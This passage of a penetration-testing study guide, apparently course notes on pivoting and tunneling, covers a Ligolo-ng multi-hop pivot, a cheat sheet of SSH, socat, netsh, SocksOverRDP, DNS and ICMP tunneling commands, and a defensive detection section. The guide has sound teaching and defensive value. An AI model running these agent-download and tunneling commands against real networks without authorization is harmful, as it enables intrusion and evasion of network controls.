listener_add --addr <INTERNAL_IP>:<ANY_PORT> --to 0.0.0.0:<SAME_ANY_PORT>
```
Serve/deliver a second agent the same way as before, this time addressed to the internal-facing listener you just added:
```powershell
Invoke-WebRequest -uri http://<INTERNAL_IP>:<SAME_ANY_PORT>/agent.exe -O agent.exe
```
Add a listener for the agent's callback port too:
```
listener_add --addr <INTERNAL_IP>:11601 --to 0.0.0.0:11601
```
Run the agent from that second (pivoted) host:
```powershell
.\agent.exe -connect <INTERNAL_IP>:11601 -ignore-cert
```

### Useful housekeeping commands

```
interface_list            # show the networks currently reachable through Ligolo-ng
interface_delete --name <Interface_Name>   # remove a tunnel interface you no longer need
session                   # list/select active agent sessions
autoroute                 # (re)configure routes for the selected session
```
> **Correction:** the command to remove an interface is `interface_delete`, not `interface_del`.

Once routed, verify from your normal terminal (outside the Ligolo-ng console):
```bash
ping <Internal_IP>
```
From here you can reach that internal host with any normal tool — including RDP — even though your attack box could never see it directly to begin with.

---

## Quick Reference Cheat Sheet

| Goal | Tool / Technique | Core Command |
|---|---|---|
| Forward one known internal port to yourself | SSH Local Forward | `ssh -L 1234:localhost:3306 user@pivot` |
| Reach an unknown/whole internal subnet, tool-by-tool | SSH Dynamic Forward + Proxychains | `ssh -D 9050 user@pivot` then `proxychains <tool>` |
| Reach an unknown/whole internal subnet, transparently | Sshuttle | `sshuttle -r user@pivot 172.16.5.0/23 -v` |
| Target can't route back to you | SSH Remote (Reverse) Forward | `ssh -R pivot_ip:port:0.0.0.0:handler_port user@pivot` |
| Relay raw TCP via a non-SSH pivot | Socat | `socat TCP4-LISTEN:port,fork TCP4:dest_ip:dest_port` |
| Pivot host is Windows, need port relay | Netsh portproxy | `netsh interface portproxy add v4tov4 ...` |
| Already have a Meterpreter session | Meterpreter autoroute / socks_proxy / portfwd | `run autoroute -s <subnet>`, `portfwd add ...` |
| Only RDP access, need arbitrary tunneling | SocksOverRDP | `regsvr32 SocksOverRDP-Plugin.dll` + `SocksOverRDP-Server.exe` |
| Full-featured, modern, multi-hop pivoting | Ligolo-ng | `./proxy -selfcert` + `agent.exe -connect ip:11601` + `autoroute` |
| Only DNS egress allowed | Dnscat2 | DNS-encapsulated C2 channel |
| Only HTTP/HTTPS egress allowed | Chisel | HTTP-tunneled SOCKS5 |
| Only ICMP echo allowed | Ptunnel-ng | TCP-over-ICMP tunnel |

---

## Detection and Prevention

A pivoting/tunneling module is only half the picture without knowing what the defenders would actually see. A few practical signals:

- **Unusual outbound connections.** Netflow/firewall logs showing a server (especially one that shouldn't normally initiate outbound traffic, like a database or file server) suddenly making new outbound connections to unfamiliar external IPs.
- **SSH with forwarding flags.** The `-L`/`-D`/`-R` flags themselves aren't visible on the wire, but the *behavior* is: a single SSH session carrying traffic to many unrelated internal destinations, or an SSH server accepting connections from an internet-facing host and immediately fanning out to internal IPs, stands out in netflow/PCAP analysis.
- **Process and command-line auditing.** EDR/Sysmon logging of `netsh.exe interface portproxy add ...`, `regsvr32.exe SocksOverRDP-Plugin.dll`, `msfvenom`-style binaries dropped to disk, or unexpected `socat`/`ligolo` binaries appearing on a host are all strong indicators.
- **DNS anomalies.** Abnormally high query volume, high-entropy subdomains, or NULL/TXT-heavy queries to a single domain are the classic signature of DNS tunneling (e.g., dnscat2).
- **Egress filtering and segmentation.** The best structural defense: restrict which hosts are even allowed to make outbound connections, to which destinations, on which ports — this is what forces attackers toward noisier techniques like DNS/ICMP tunneling in the first place.
- **RDP virtual channel monitoring.** Enterprise RDP monitoring/DLP solutions can flag unusual Dynamic Virtual Channel usage, which is what tools like SocksOverRDP rely on.
- **Baseline + alert on new listening ports.** Any new unexpected listening TCP port on a server (e.g., a socat relay, a Ligolo agent, a Meterpreter `portfwd`) shows up in a simple `netstat`/EDR-based port baseline.

> This is a starting checklist, not a complete blue-team playbook — the point is to build the habit of thinking about detectability while practicing the offensive side.

---

## Additional Resources

- HTB Academy — *Pivoting, Tunneling, and Port Forwarding*: https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng
- Sshuttle: https://github.com/sshuttle/sshuttle
- Rpivot: https://github.com/klsecservices/rpivot
- Chisel: https://github.com/jpillora/chisel
- Dnscat2: https://github.com/iagox86/dnscat2
- Ptunnel-ng: https://github.com/utoni/ptunnel-ng
- SocksOverRDP: https://github.com/hyleong/SocksOverRDP
- Proxychains-ng: https://github.com/rofl0r/proxychains-ng
